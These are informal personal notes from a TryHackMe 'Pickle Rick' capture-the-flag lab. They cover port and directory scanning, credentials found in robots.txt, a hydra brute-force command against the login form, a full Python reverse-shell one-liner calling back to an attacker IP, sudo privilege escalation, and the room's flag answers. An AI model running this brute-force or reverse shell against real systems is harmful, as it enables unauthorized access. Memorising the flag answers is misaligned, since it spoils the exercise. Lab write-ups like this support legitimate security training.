[https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)
 
nmap  
ports:  
80 http  
22 SSH
 
Apache/2.4.18  
http-title: Rick is sup4r cool
 
gobuster  
/assets  
/server-status //403 forbidden
 
 Website - robots.txt  
Username: R1ckRul3s  
Wubbalubbadubdub
 
tried curl  
tried hydra -- need private key // password auth not supported
 
robots.txt: Wubbalubbadubdub  
found /login.php page
 
can use hydra to find password but IDK how to use it with HTTP  
so i will try burpsuite
 
username=R1ckRul3s&password=^PASS^&sub=Login
 
Invalid username or password.
 
tried burpsuite but couldnt make it work lol  
learned how to use hydra with http:
 
*** (not needed)  
hydra -t 4 -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt 10.10.61.125 http-post-form "/login.php:username=R1ckRul3s&password=^PASS^&sub=Login:Invalid username or password."  
***
 
method = http-post-form (found from inspect element on login page, when tried login it showed a POST request)  
path = (path to login page from index page: click on POST request, "edit and resend", then look at "request body" section to find the text: finally, the text that appears on screen when login failed.)
   

nikto  
Nikto -h [http://IP](http://IP)  
found /login.php
 
USERNAME: R1ckRul3s  
PASSWORD: Wubbalubbadubdub
 
clue.txt:  
Look around the file system for the other ingredient.
 
Found in page source (rabbit hole):  
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
 
grep -R .
 
less files to find first flag  
move to /home/rick to find second flag
   

test if python works:  
python -c "print('hello')" ##doesnt work try python3  
python3 -c "print('hello')" # IT WORKS!
 
get python reverse shell from pentest monkey (change ip and use python3)  
netcat listener  
then:
 
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.210.63",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
sudo -l >> all commands can be run as sudo w/o password
 
GTFObins python privesc, change to python3 // OR USE SUDO BASH  
sudo su  
/root for 3rd flag
 
YOU'RE IN.
      

10.10.180.68
 
R1ckRul3s:Wubbalubbadubdub
 
22  
80
 
mr. meeseek hair  
1 jerry tear  
fleeb juice